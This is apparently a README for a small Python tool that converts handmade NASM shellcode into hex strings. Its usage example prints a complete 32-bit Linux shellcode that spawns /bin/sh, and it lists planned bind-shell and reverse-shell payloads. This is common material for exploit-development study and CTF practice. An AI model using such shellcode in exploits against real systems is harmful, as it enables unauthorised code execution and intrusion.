# Pyshell
Some ASM shellcodes, with a python wrapper for easy asm->hex conversion.

### Usage

Simply launch the script with python3 and specify an assembler code:

```
entropy@undefined:~/Pyshell$ python3 pyshell.py asm/shell.32bit.nasm 
[+] Encoded:
 \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80
 ```
 
 ### ASM Shellcodes
 
 They are some handmade shellcode already in the `asm` directory:
  - `shell.32bit.nasm`          (Standart shellcode that pops a shell)
  - `priv_shell.32bit.nasm`     (Basic shell with privilege restoration)
    
 To add:
  - Read a file and print the content
  - Shell bound to a tcp port
  - Reverse shell over tcp
  - 64 bits shellcodes
